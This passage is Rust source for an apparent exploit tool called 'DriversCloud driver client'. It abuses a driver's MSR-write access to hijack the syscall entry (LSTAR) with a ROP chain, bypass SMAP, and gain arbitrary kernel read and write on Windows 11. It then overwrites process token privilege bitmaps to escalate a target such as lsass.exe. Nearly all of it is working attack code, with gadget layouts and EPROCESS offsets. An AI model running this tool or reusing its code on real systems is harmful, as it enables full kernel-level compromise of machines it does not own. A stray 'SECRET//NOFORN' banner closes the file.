                        out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                        options(att_syntax),
                    );
                },
                ReadReg::R9 => {
                    std::arch::asm!(
                        "leaq .L_kread_ret_r9(%rip), %r10",
                        "movq %r10, 88({rop})",
                        "pushfq",
                        "popq %r10",
                        "movq %r10, 104({rop})",
                        "movq %rsp, 112({rop})",
                        "pushfq",
                        "popq %r10",
                        "orq $0x40000, %r10",
                        "pushq %r10",
                        "popfq",
                        "movq {src}, %r9",
                        "movq {rop}, %rsp",
                        "syscall",
                        ".L_kread_ret_r9:",
                        rop = in(reg) rop_ptr,
                        src = in(reg) src,
                        out("rax") _, out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
                        options(att_syntax),
                    );
                }
            }
        }

        // read_volatile: prevent compiler from caching result=0 across asm boundary
        let val = unsafe { std::ptr::read_volatile(&result as *const u64) };
        Ok(val)
    }
}

impl Drop for KernelRW<'_> {
    fn drop(&mut self) { self.teardown(); }
}

// ── priv escalation via token bitmap overwrite ────────────────────────────────
//
// EPROCESS offsets confirmed via kdump on Windows 11 25H2 (build 26200):
//   +0x1D0: UniqueProcessId
//   +0x1D8: ActiveProcessLinks (LIST_ENTRY, Flink -> next EPROCESS+0x1D8)
//   +0x248: Token (_EX_FAST_REF, mask low 4 bits for pointer)
const EPROC_UNIQUE_PID:    u64 = 0x1D0;
const EPROC_ACTIVE_LINKS:  u64 = 0x1D8; // Flink (points to next EPROC+0x1D8)
const EPROC_TOKEN:         u64 = 0x248; // _EX_FAST_REF -> mask off low 4 bits
const EPROC_IMAGE_FILENAME: u64 = 0x338; // CHAR[15] image name
const TOKEN_SEP_PRESENT:   u64 = 0x40;
const TOKEN_SEP_ENABLED:   u64 = 0x48;

fn cmd_priv(dev: &Device, target_pid: u64) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt   = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found")?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe   = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;

    let krw = KernelRW::setup(dev, &pe, nt.va)?;

    let ps_init_va   = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    let system_eproc = krw.kread(ps_init_va)?;
    if system_eproc == 0 || system_eproc < 0xFFFF_8000_0000_0000 {
        bail!("kread returned bad value 0x{:016X} - LSTAR hijack failed", system_eproc);
    }

    // Walk ActiveProcessLinks to find target PID
    let mut found_eproc: Option<u64> = None;
    let mut current = system_eproc;
    let mut iterations = 0;
    loop {
        iterations += 1;
        if iterations > 5000 {
            bail!("EPROCESS walk exceeded 5000 iterations");
        }
        if current < 0xFFFF_8000_0000_0000 {
            bail!("invalid EPROCESS address 0x{:016X}", current);
        }
        let pid = krw.kread(current + EPROC_UNIQUE_PID)?;
        if pid == target_pid {
            found_eproc = Some(current);
            break;
        }
        let flink = krw.kread(current + EPROC_ACTIVE_LINKS)?;
        if flink < 0xFFFF_8000_0000_0000 {
            bail!("invalid flink 0x{:016X} during EPROCESS walk", flink);
        }
        let next = flink.wrapping_sub(EPROC_ACTIVE_LINKS);
        if next == system_eproc || next == 0 { break; }
        current = next;
    }

    let eproc = found_eproc.with_context(|| format!("PID {} not found in EPROCESS list", target_pid))?;
    println!("[+] EPROCESS=0x{:016X}", eproc);

    // Get token (EX_FAST_REF -> mask low 4 bits)
    let token_ref = krw.kread(eproc + EPROC_TOKEN)?;
    let token     = token_ref & !0xF;
    println!("[+] Token=0x{:016X}", token);

    // Overwrite SEP_TOKEN_PRIVILEGES: Present + Enabled = all bits set
    krw.kwrite(token + TOKEN_SEP_PRESENT, 0xFFFF_FFFF_FFFF_FFFF)?;
    krw.kwrite(token + TOKEN_SEP_ENABLED, 0xFFFF_FFFF_FFFF_FFFF)?;

    // Verify
    let chk_present = krw.kread(token + TOKEN_SEP_PRESENT)?;
    let chk_enabled = krw.kread(token + TOKEN_SEP_ENABLED)?;
    if chk_present == 0xFFFF_FFFF_FFFF_FFFF && chk_enabled == 0xFFFF_FFFF_FFFF_FFFF {
        println!("[+] PID {} is God", target_pid);
    } else {
        println!("[!] verify mismatch - check offsets");
    }

    Ok(())
}

fn read_image_filename(krw: &KernelRW, eproc: u64) -> Result<String> {
    let lo = krw.kread(eproc + EPROC_IMAGE_FILENAME)?;
    let hi = krw.kread(eproc + EPROC_IMAGE_FILENAME + 8)?;
    let mut bytes = [0u8; 15];
    bytes[0..8].copy_from_slice(&lo.to_le_bytes());
    bytes[8..15].copy_from_slice(&hi.to_le_bytes()[0..7]);
    let nul = bytes.iter().position(|&b| b == 0).unwrap_or(15);
    Ok(String::from_utf8_lossy(&bytes[..nul]).to_string())
}

fn cmd_privn(dev: &Device, target_name: &str) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt   = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found")?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe   = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;

    let krw = KernelRW::setup(dev, &pe, nt.va)?;

    let ps_init_va   = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    let system_eproc = krw.kread(ps_init_va)?;
    if system_eproc == 0 || system_eproc < 0xFFFF_8000_0000_0000 {
        bail!("kread returned bad value 0x{:016X} - LSTAR hijack failed", system_eproc);
    }

    let target_lower = target_name.to_ascii_lowercase();
    let mut matched = 0usize;
    let mut current = system_eproc;
    let mut iterations = 0usize;

    loop {
        iterations += 1;
        if iterations > 5000 {
            bail!("EPROCESS walk exceeded 5000 iterations");
        }
        if current < 0xFFFF_8000_0000_0000 {
            bail!("invalid EPROCESS address 0x{:016X}", current);
        }

        let name = read_image_filename(&krw, current)?;
        if name.to_ascii_lowercase() == target_lower {
            let pid = krw.kread(current + EPROC_UNIQUE_PID)?;

            let token_ref = krw.kread(current + EPROC_TOKEN)?;
            let token     = token_ref & !0xF;

            krw.kwrite(token + TOKEN_SEP_PRESENT, 0xFFFF_FFFF_FFFF_FFFF)?;
            krw.kwrite(token + TOKEN_SEP_ENABLED, 0xFFFF_FFFF_FFFF_FFFF)?;

            let chk_present = krw.kread(token + TOKEN_SEP_PRESENT)?;
            let chk_enabled = krw.kread(token + TOKEN_SEP_ENABLED)?;
            if chk_present == 0xFFFF_FFFF_FFFF_FFFF && chk_enabled == 0xFFFF_FFFF_FFFF_FFFF {
                println!("[+] PID {} ({}) is God", pid, name);
            } else {
                println!("[!] PID {} ({}) verify mismatch - check offsets", pid, name);
            }
            matched += 1;
        }

        let flink = krw.kread(current + EPROC_ACTIVE_LINKS)?;
        if flink < 0xFFFF_8000_0000_0000 {
            bail!("invalid flink 0x{:016X} during EPROCESS walk", flink);
        }
        let next = flink.wrapping_sub(EPROC_ACTIVE_LINKS);
        if next == system_eproc || next == 0 { break; }
        current = next;
    }

    if matched == 0 {
        println!("[!] no processes matching '{}'", target_name);
    }
    Ok(())
}

// ── kread / kdump: arbitrary kernel VA read via LSTAR hijack ─────────────────

// Shared setup: locate ntoskrnl, read PE from disk, build KernelRW.
// Returns (KernelRW, pe_bytes, nt_mod) ready for kread/kwrite calls.
fn open_krw(dev: &Device) -> Result<(KernelRW<'_>, Vec<u8>)> {
    let mods = get_kernel_modules()?;
    let nt   = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found")?;
    println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
    let path = ntoskrnl_disk_path(&mods)?;
    let pe   = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let krw  = KernelRW::setup(dev, &pe, nt.va)?;
    println!("[+] KernelRW ready");
    { use std::io::Write; let _ = std::io::stdout().flush(); }
    Ok((krw, pe))
}

fn cmd_kread(dev: &Device, target_va: u64) -> Result<()> {
    let (krw, _) = open_krw(dev)?;
    let val = krw.kread(target_va)?;
    println!("[+] kread [0x{:016X}] = 0x{:016X}  ({})", target_va, val, val);
    Ok(())
}

fn cmd_kdump(dev: &Device, target_va: u64, count: u64) -> Result<()> {
    let (krw, _) = open_krw(dev)?;
    println!("[+] dumping {} qwords from 0x{:016X}:", count, target_va);
    for i in 0..count {
        let addr = target_va + i * 8;
        match krw.kread(addr) {
            Ok(v)  => println!("  0x{:016X}: 0x{:016X}", addr, v),
            Err(e) => println!("  0x{:016X}: ERROR {}", addr, e),
        }
    }
    Ok(())
}

// Shortcut: look up PsInitialSystemProcess and dereference it to get System EPROCESS.
fn cmd_eprocess(dev: &Device) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt   = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found")?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe   = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let ps_va = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    println!("[+] PsInitialSystemProcess VA=0x{:016X}", ps_va);
    let krw = KernelRW::setup(dev, &pe, nt.va)?;
    let eproc = krw.kread(ps_va)?;
    println!("[+] System EPROCESS=0x{:016X}", eproc);
    Ok(())
}

fn resolve_system_eprocess(dev: &Device) -> Result<(KernelRW<'_>, u64)> {
    let mods  = get_kernel_modules()?;
    let nt    = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found")?;
    let path  = ntoskrnl_disk_path(&mods)?;
    let pe    = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let ps_va = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    let krw   = KernelRW::setup(dev, &pe, nt.va)?;
    let eproc = krw.kread(ps_va)?;
    if eproc < 0xFFFF_8000_0000_0000 {
        bail!("PsInitialSystemProcess kread returned bad value 0x{:016X}", eproc);
    }
    println!("[+] System EPROCESS=0x{:016X}", eproc);
    Ok((krw, eproc))
}

fn cmd_procid(dev: &Device) -> Result<()> {
    let (krw, eproc) = resolve_system_eprocess(dev)?;
    let pid = krw.kread(eproc + EPROC_UNIQUE_PID)?;
    println!("[+] UniqueProcessId (+0x{:X}) = {}", EPROC_UNIQUE_PID, pid);
    Ok(())
}

fn cmd_proclinks(dev: &Device) -> Result<()> {
    let (krw, eproc) = resolve_system_eprocess(dev)?;
    let flink = krw.kread(eproc + EPROC_ACTIVE_LINKS)?;
    let blink = krw.kread(eproc + EPROC_ACTIVE_LINKS + 8)?;
    println!("[+] ActiveProcessLinks (+0x{:X}):", EPROC_ACTIVE_LINKS);
    println!("    Flink = 0x{:016X}  (EPROCESS 0x{:016X})", flink, flink.wrapping_sub(EPROC_ACTIVE_LINKS));
    println!("    Blink = 0x{:016X}  (EPROCESS 0x{:016X})", blink, blink.wrapping_sub(EPROC_ACTIVE_LINKS));
    Ok(())
}

fn cmd_token(dev: &Device) -> Result<()> {
    let (krw, eproc) = resolve_system_eprocess(dev)?;
    let token_ref = krw.kread(eproc + EPROC_TOKEN)?;
    let token     = token_ref & !0xF;
    println!("[+] Token (+0x{:X}):", EPROC_TOKEN);
    println!("    EX_FAST_REF = 0x{:016X}  (ptr = 0x{:016X})", token_ref, token);
    Ok(())
}

// ── LSTAR hijack kernel write primitive ──────────────────────────────────────
//
// ROP stack layout (13 x u64).  Before SYSCALL: RAX=write_value, RDX=target_va,
// RSP=&rop[0], LSTAR -> write_mem gadget.
//
//   write_mem executes:  mov [rdx],rax ; ret
//   rop[0]  -> pop rdx ; ret           (load EDX = lstar_hi for wrmsr)
//   rop[1]     lstar_hi
//   rop[2]  -> pop rax ; ret           (load EAX = lstar_lo for wrmsr)
//   rop[3]     lstar_lo
//   rop[4]  -> pop rcx ; ret           (load ECX = MSR_LSTAR for wrmsr)
//   rop[5]     MSR_LSTAR (0xC0000082)
//   rop[6]  -> wrmsr ; ret             (restore LSTAR atomically)
//   rop[7]  -> iretq                   (return to ring 3)
//   rop[8]     return_rip              filled in asm (label after syscall)
//   rop[9]     0x33                    CS  (user)
//   rop[10]    rflags                  filled in asm
//   rop[11]    user_rsp                filled in asm (original RSP)
//   rop[12]    0x2b                    SS  (user)

#[inline(never)]
#[allow(named_asm_labels)]
fn cmd_kwrite(dev: &Device, target_va: u64, write_value: u64) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found")?;
    println!("[+] ntoskrnl VA=0x{:016X}", nt.va);

    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;

    let gadgets = scan_gadgets_in_pe(&pe, nt.va)?;
    if !gadgets.all_found() {
        bail!("missing ROP gadgets in ntoskrnl.exe");
    }
    println!("[+] all ROP gadgets found");

    // Pin to core 0 BEFORE MSR reads/writes: per-core MSRs must be accessed on
    // the same core that will execute SYSCALL.
    unsafe {
        let t = GetCurrentThread();
        SetThreadAffinityMask(t, 1);
        SetThreadPriority(t, THREAD_PRIORITY_TIME_CRITICAL);
    }
    println!("[*] thread pinned to core 0, priority=TIME_CRITICAL");

    let lstar_orig = msr_read(dev, MSR_LSTAR)?;
    println!("[+] IA32_LSTAR=0x{:016X}", lstar_orig);

    // Clear AC bit in FMASK so SYSCALL preserves AC=1 (SMAP bypass)
    let fmask_orig = msr_read(dev, MSR_FMASK)?;
    let fmask_new = fmask_orig & !(1u64 << 18);
    if fmask_new != fmask_orig {
        msr_write(dev, MSR_FMASK, fmask_new)?;
        println!("[*] FMASK 0x{:016X} -> 0x{:016X}", fmask_orig, fmask_new);
    }

    // Build ROP stack
    let lstar_lo = lstar_orig & 0xFFFF_FFFF;
    let lstar_hi = lstar_orig >> 32;

    let mut rop = vec![0u64; 13];
    rop[0]  = gadgets.pop_rdx.unwrap();
    rop[1]  = lstar_hi;
    rop[2]  = gadgets.pop_rax.unwrap();
    rop[3]  = lstar_lo;
    rop[4]  = gadgets.pop_rcx.unwrap();
    rop[5]  = MSR_LSTAR as u64;
    rop[6]  = gadgets.wrmsr_ret.unwrap();
    rop[7]  = gadgets.iretq.unwrap();
    // rop[8] return_rip  -- filled in asm
    rop[9]  = 0x33;   // CS  (user mode)
    // rop[10] rflags     -- filled in asm
    // rop[11] user_rsp   -- filled in asm
    rop[12] = 0x2b;   // SS  (user mode)

    let rop_ptr = rop.as_mut_ptr() as u64;

    // Flush before the critical window: no syscalls allowed between here and the asm block
    let write_gadget = gadgets.write_mem.unwrap();
    println!("[*] writing 0x{:016X} -> [0x{:016X}]  LSTAR=0x{:016X}", write_value, target_va, write_gadget);
    { use std::io::Write; let _ = std::io::stdout().flush(); }

    msr_write(dev, MSR_LSTAR, write_gadget)?;
    // !! NO syscalls (no println, no alloc, no I/O) between here and the asm block !!

    unsafe {
        std::arch::asm!(
            "leaq .L_cmd_kwrite_ret(%rip), %r10",
            "movq %r10, 64({rop})",
            "pushfq",
            "popq %r10",
            "movq %r10, 80({rop})",
            "movq %rsp, 88({rop})",
            "pushfq",
            "popq %r10",
            "orq $0x40000, %r10",
            "pushq %r10",
            "popfq",
            "movq {val}, %rax",
            "movq {tgt}, %rdx",
            "movq {rop}, %rsp",
            "syscall",
            ".L_cmd_kwrite_ret:",
            rop = in(reg) rop_ptr,
            val = in(reg) write_value,
            tgt = in(reg) target_va,
            out("rax") _,
            out("rcx") _,
            out("rdx") _,
            out("r10") _,
            out("r11") _,
            options(att_syntax),
        );
    }

    println!("[+] returned cleanly from ROP chain");

    // Verify LSTAR restored
    let lstar_check = msr_read(dev, MSR_LSTAR)?;
    if lstar_check == lstar_orig {
        println!("[+] LSTAR verified: 0x{:016X}", lstar_check);
    } else {
        println!("[!] LSTAR MISMATCH: got 0x{:016X}, expected 0x{:016X}", lstar_check, lstar_orig);
    }

    // Restore FMASK
    if fmask_new != fmask_orig {
        msr_write(dev, MSR_FMASK, fmask_orig)?;
        println!("[*] FMASK restored");
    }

    // Restore thread settings
    unsafe {
        let t = GetCurrentThread();
        SetThreadPriority(t, THREAD_PRIORITY_NORMAL);
        SetThreadAffinityMask(t, !0usize);
    }

    Ok(())
}

// ── Hexdump ──────────────────────────────────────────────────────────────────

fn hexdump(data: &[u8], base_addr: u64) {
    let mut off = 0usize;
    while off < data.len() {
        let row = &data[off..data.len().min(off + 16)];
        print!("{:016X}  ", base_addr + off as u64);
        for (i, b) in row.iter().enumerate() {
            if i == 8 { print!(" "); }
            print!("{:02X} ", b);
        }
        for _ in row.len()..16 { print!("   "); }
        if row.len() <= 8 { print!(" "); }
        print!(" |");
        for b in row {
            let c = if b.is_ascii_graphic() || *b == b' ' { *b as char } else { '.' };
            print!("{}", c);
        }
        println!("|");
        off += 16;
    }
}

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(name = "DriversCloud", about = "DriversCloud driver client")]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Read physical memory (32-bit PA limit)
    #[command(name = "r-mem")]
    RMem {
        /// Physical address (hex 0x... or decimal)
        addr: String,
        /// Number of bytes to read
        len: String,
        /// Print as raw bytes to stdout instead of hexdump
        #[arg(long)]
        raw: bool,
    },

    /// Read an MSR register
    #[command(name = "rdmsr")]
    Rdmsr {
        /// MSR index (hex 0x... or decimal)
        msr: String,
    },

    /// Find ntoskrnl base
    #[command(name = "kbase")]
    FindKbase,

    /// Write an MSR register
    #[command(name = "wrmsr")]
    Wrmsr {
        /// MSR index (hex 0x... or decimal)
        msr: String,
        /// 64-bit value to write (hex 0x... or decimal)
        value: String,
    },

    /// Scan ntoskrnl.exe on disk for ROP gadgets needed for LSTAR hijack
    #[command(name = "rop")]
    ScanGadgets,

    /// Look up a named export in ntoskrnl.exe and print its runtime VA
    #[command(name = "lookup")]
    LookupExport {
        /// Symbol name (e.g. NtBuildNumber)
        symbol: String,
    },

    /// Arbitrary kernel read via LSTAR hijack + ROP chain
    #[command(name = "kread")]
    KRead {
        /// Kernel VA to read from (hex 0x... or decimal)
        addr: String,
    },

    /// Dump N qwords from a kernel VA via repeated kread
    #[command(name = "kdump")]
    KDump {
        /// Kernel VA (hex 0x... or decimal)
        addr: String,
        /// Number of qwords to read (default 16)
        #[arg(default_value = "16")]
        count: u64,
    },

    /// Arbitrary kernel write via LSTAR hijack + ROP chain
    #[command(name = "kwrite")]
    KWrite {
        /// Target kernel VA (hex 0x... or decimal)
        target: String,
        /// 64-bit value to write (hex 0x... or decimal)
        value: String,
    },

    /// Read IA32_LSTAR (0xC0000082) - shows current syscall entry point
    #[command(name = "sysentry")]
    SysEntry,

    /// Look up PsInitialSystemProcess and dereference it to get System EPROCESS
    #[command(name = "eprocess")]
    EProcess,

    /// Read UniqueProcessId (+0x28) from System EPROCESS
    #[command(name = "procid")]
    ProcId,

    /// Read ActiveProcessLinks Flink+Blink (+0x10) from System EPROCESS
    #[command(name = "proclinks")]
    ProcLinks,

    /// Read Token EX_FAST_REF (+0x30) from System EPROCESS
    #[command(name = "token")]
    Token,

    /// Escalate privileges: give a PID (decimal/hex) or an image name (e.g. lsass.exe)
    #[command(name = "priv")]
    Priv {
        /// PID (decimal or 0x hex) or image name (e.g. lsass.exe)
        target: String,
    },
}

fn cmd_find_kbase(dev: &Device) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
        .context("ntoskrnl not found in module list")?;
    println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
    println!("  [i] size=0x{:X}", nt.size);

    let lstar = match msr_read(dev, MSR_LSTAR) {
        Ok(v) => { println!("[+] IA32_LSTAR=0x{:016X}", v); v }
        Err(e) => { println!("[~] RDMSR LSTAR failed: {}", e); 0 }
    };
    if lstar == 0 {
        println!("[!] cannot validate CR3 without LSTAR");
        return Ok(());
    }

    match find_cr3_for_va(dev, nt.va, nt.size, lstar) {
        Some((cr3, nt_pa)) => {
            println!("[+] CR3=0x{:X}", cr3);
            println!("[+] ntoskrnl PA=0x{:X}", nt_pa);
        }
        None => {
            //println!("[i] CR3 not found");
            return Ok(());
        }
    }

    Ok(())
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    let dev = Device::open(DEVICE_PATH)
        .context("failed to open DriversCloud device")?;

    match cli.cmd {
        Cmd::RMem { addr, len, raw } => {
            let pa    = parse_hex_or_dec(&addr)?;
            let count = parse_hex_or_dec(&len)? as u32;
            let data  = phys_read_result(&dev, pa, count)?;
            if raw {
                use std::io::Write;
                std::io::stdout().write_all(&data)?;
            } else {
                println!("[+] read {} bytes from PA=0x{:X}", data.len(), pa);
                hexdump(&data, pa);
            }
        }

        Cmd::Rdmsr { msr } => {
            let idx = parse_hex_or_dec(&msr)? as u32;
            let val = msr_read(&dev, idx)?;
            println!("MSR 0x{:08X} = 0x{:016X}", idx, val);
        }

        Cmd::FindKbase => {
            cmd_find_kbase(&dev)?;
        }

        Cmd::Wrmsr { msr, value } => {
            let idx = parse_hex_or_dec(&msr)? as u32;
            let val = parse_hex_or_dec(&value)?;
            msr_write(&dev, idx, val)?;
            println!("[+] wrmsr MSR=0x{:08X} value=0x{:016X}", idx, val);
        }

        Cmd::ScanGadgets => {
            let mods = get_kernel_modules()?;
            let nt = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
                .context("ntoskrnl not found in module list")?;
            println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
            println!("  [i] size=0x{:X}", nt.size);
            cmd_scan_gadgets(&mods, nt.va)?;
        }

        Cmd::LookupExport { symbol } => {
            cmd_lookup_export(&symbol)?;
        }

        Cmd::SysEntry => {
            let lstar = msr_read(&dev, MSR_LSTAR)?;
            println!("[+] IA32_LSTAR (0xC0000082) = 0x{:016X}", lstar);
        }

        Cmd::EProcess => {
            cmd_eprocess(&dev)?;
        }

        Cmd::ProcId => {
            cmd_procid(&dev)?;
        }

        Cmd::ProcLinks => {
            cmd_proclinks(&dev)?;
        }

        Cmd::Token => {
            cmd_token(&dev)?;
        }

        Cmd::KRead { addr } => {
            let va = parse_hex_or_dec(&addr)?;
            cmd_kread(&dev, va)?;
        }

        Cmd::KDump { addr, count } => {
            let va = parse_hex_or_dec(&addr)?;
            cmd_kdump(&dev, va, count)?;
        }

        Cmd::KWrite { target, value } => {
            let target_va = parse_hex_or_dec(&target)?;
            let val       = parse_hex_or_dec(&value)?;
            cmd_kwrite(&dev, target_va, val)?;
        }

        Cmd::Priv { target } => {
            match parse_hex_or_dec(&target) {
                Ok(pid) => cmd_priv(&dev, pid)?,
                Err(_)  => cmd_privn(&dev, &target)?,
            }
        }
    }

    Ok(())
}

/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/
